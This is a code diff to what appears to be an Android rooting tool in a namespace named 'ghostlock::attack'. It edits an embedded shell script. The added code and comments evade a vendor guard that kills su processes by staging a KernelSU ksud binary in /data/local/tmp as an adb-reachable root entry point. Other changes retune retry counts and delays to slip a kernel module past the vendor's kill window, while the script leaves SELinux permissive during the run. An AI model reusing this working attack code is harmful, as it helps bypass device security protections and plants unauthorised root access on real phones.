@@ -332,6 +332,16 @@ namespace ghostlock::attack {
             "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
             "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
             "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+            /* The vendor guard kills a process exec'd from a path ending in
+             * /su (measured 2026-11-15: `adb shell su -c id` -> "Killed", and
+             * opening the manager raises the vendor's block prompt). ksud's
+             * `debug su` grants root through the supercall and then execs `sh`,
+             * so this entry point never touches the su path. Stage a copy where
+             * adb shell can reach it; allow_shell already permits uid 2000. */
+            "if cp \"$KSUD\" /data/local/tmp/ksud 2>/dev/null; then\n"
+            "  chmod 755 /data/local/tmp/ksud 2>/dev/null\n"
+            "  echo 'KSU-ROOT-ENTRY /data/local/tmp/ksud debug su'\n"
+            "fi\n"
             /* W1 leaves SELinux permissive; every post-W1 failure exit restores
              * it, so a run that cannot finish the root phase does not leave the
              * device permissive until reboot. Dumps are written before this
@@ -443,9 +453,9 @@ namespace ghostlock::attack {
              * crown lines. */
             "ksu_capture() {\n"
             "  n=0; miss=0\n"
-            "  while [ \"$n\" -lt 20 ]; do\n"
+            "  while [ \"$n\" -lt 12 ]; do\n"
             "    n=$((n + 1))\n"
-            "    if timeout 2 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
+            "    if timeout 1 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
             "      mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
             "      if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
             "      miss=0\n"
@@ -818,7 +828,10 @@ namespace ghostlock::attack {
             "  sleep \"$LATE_LOAD_SETTLE\"\n"
             "  KSU_ATTEMPT=0\n"
             "  KSU_SEEN=absent\n"
-            "  while [ \"$KSU_ATTEMPT\" -lt 2 ]; do\n"
+            /* Measured 2026-11-15: the same 4 s settle loaded the module at
+             * 13:10 and missed it at 13:34, so the vendor's kill window is not
+             * fixed. Three attempts, spaced wider each time. */
+            "  while [ \"$KSU_ATTEMPT\" -lt 3 ]; do\n"
             "    KSU_ATTEMPT=$((KSU_ATTEMPT + 1))\n"
             "    run_late_load \"$LATE_LOAD_MODE\"\n"
             "    ksu_capture\n"
@@ -839,7 +852,7 @@ namespace ghostlock::attack {
             "    if [ \"$OEM_GATE\" -eq 0 ]; then\n"
             "      if [ \"$LATE_LOAD_MODE\" = direct ]; then LATE_LOAD_MODE=mount; else LATE_LOAD_MODE=direct; fi\n"
             "    fi\n"
-            "    sleep 2\n"
+            "    sleep 4\n"
             "  done\n"
             "fi\n"
             "if [ \"$KSU_ALREADY\" -eq 0 ]; then\n"
